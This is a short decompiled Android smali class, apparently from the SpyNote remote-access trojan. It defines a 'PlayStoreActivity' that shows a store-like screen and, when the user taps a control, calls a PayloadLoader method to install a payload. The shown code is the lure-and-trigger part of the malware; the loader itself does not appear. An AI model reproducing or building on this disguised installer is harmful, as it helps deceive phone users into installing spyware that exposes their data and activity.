.class public Lorg/spynote/PlayStoreActivity;
.super Landroid/app/Activity;
.implements Landroid/view/View$OnClickListener;
.source "PlayStoreActivity.java"


.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method


.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const v0, 0x7f030001
    invoke-virtual {p0, v0}, Lorg/spynote/PlayStoreActivity;->setContentView(I)V

    const v0, 0x7f070001
    invoke-virtual {p0, v0}, Lorg/spynote/PlayStoreActivity;->findViewById(I)Landroid/view/View;
    move-result-object v0
    if-eqz v0, :done
    invoke-virtual {v0, p0}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    :done
    return-void
.end method


.method public onClick(Landroid/view/View;)V
    .locals 0
    invoke-static {p0}, Lorg/spynote/PayloadLoader;->installFromUi(Landroid/content/Context;)V
    return-void
.end method
